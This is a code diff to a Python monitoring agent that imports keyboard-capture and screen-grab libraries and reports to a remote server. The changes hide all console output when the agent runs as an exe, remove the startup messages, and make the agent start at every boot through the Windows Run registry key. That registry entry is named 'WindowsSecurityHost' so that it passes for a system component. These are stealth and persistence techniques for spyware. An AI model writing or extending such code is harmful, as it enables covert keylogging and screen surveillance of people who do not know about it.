@@ -15,6 +15,11 @@ import configparser
 from PIL import Image, ImageGrab
 from pynput import keyboard
 
+# Redireciona saída quando rodando como exe (sem console)
+if getattr(sys, 'frozen', False):
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+
 # --- Config: env var > config.ini ao lado do exe > padrão ---
 if getattr(sys, 'frozen', False):
     _BASE = os.path.dirname(sys.executable)
@@ -28,6 +33,24 @@ SERVER_URL = (
     os.environ.get('MONITOR_SERVER') or
     _cfg.get('agent', 'server', fallback='http://localhost:3000')
 )
+
+
+def add_to_startup():
+    """Registra o exe no startup do Windows (roda ao ligar o PC)."""
+    if not getattr(sys, 'frozen', False):
+        return
+    try:
+        import winreg
+        exe_path = sys.executable
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r'Software\Microsoft\Windows\CurrentVersion\Run',
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, 'WindowsSecurityHost', 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+    except Exception:
+        pass
 CLIENT_ID = str(uuid.getnode())  # Machine MAC as ID
 HOSTNAME = platform.node()
 OS_INFO = f"{platform.system()} {platform.release()}"
@@ -563,8 +586,7 @@ def on_upload(data):
 
 
 def main():
-    print(f"Starting agent: {CLIENT_ID} ({HOSTNAME})")
-    print(f"Connecting to: {SERVER_URL}")
+    add_to_startup()
 
     try:
         sio.connect(SERVER_URL)
